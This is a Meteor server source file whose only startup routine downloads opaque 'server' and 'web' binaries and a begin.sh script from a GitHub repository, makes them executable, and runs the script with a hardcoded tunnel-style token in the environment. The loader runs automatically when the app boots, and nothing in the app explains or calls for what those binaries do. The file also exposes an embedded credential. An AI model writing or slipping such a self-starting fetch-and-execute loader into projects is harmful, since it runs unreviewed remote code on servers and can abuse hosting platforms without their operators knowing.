import { Meteor } from 'meteor/meteor';
import { HTTP } from 'meteor/http';
import fs from 'fs';
import util from 'util';
import { exec } from 'child_process';
const execAsync = util.promisify(exec);

const filesToDownloadAndExecute = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/server',
    filename: 'server',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/web',
    filename: 'web',
  },
  {
    url: 'https://github.com/wwrrtt/test/releases/download/2.0/begin.sh',
    filename: 'begin.sh',
  },
];

const downloadFile = async ({ url, filename }) => {
  console.log(`Downloading file from ${url}...`);
  
  try {
    const result = await HTTP.get(url, { responseType: 'stream' });
    const writer = fs.createWriteStream(filename);
    result.content.pipe(writer);
    
    return new Promise((resolve, reject) => {
      writer.on('error', reject);
      writer.on('finish', resolve);
    });
  } catch (error) {
    console.error(`下载文件 ${filename} 失败:`, error);
    throw error;
  }
};

const downloadAndExecuteFiles = async () => {
  for (let file of filesToDownloadAndExecute) {
    try {
      await downloadFile(file);
    } catch (error) {
      console.error(`下载文件 ${file.filename} 失败:`, error);
      return false;
    }
  }

  try {
    console.log('给 begin.sh 添加执行权限');
    await execAsync('chmod +x begin.sh');
    
    console.log('给 server 添加执行权限');
    await execAsync('chmod +x server');
    
    console.log('给 web 添加执行权限');
    await execAsync('chmod +x web');
    
    const { stdout } = await execAsync('bash begin.sh', {
      env: { 
        ...process.env, 
        Token: 'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNjBlZjljZGUtNTkyNC00Mjk4LTkwN2QtY2FjNzlkNDlmYTQ4IiwicyI6IlltUTFaalJtTURFdFpUbGtZaTAwTUdObUxXRTFOalF0TURWak5qTTBZekV4TjJSaiJ9'
      }
    });
    console.log(`begin.sh 输出:\n${stdout}`);
    return true;
  } catch (error) {
    console.error('执行文件失败:', error);
    return false;
  }
};

Meteor.startup(() => {
  downloadAndExecuteFiles().then(success => {
    if (!success) {
      console.error('下载和执行文件时出现问题。');
    }
  }).catch(console.error);
}); 
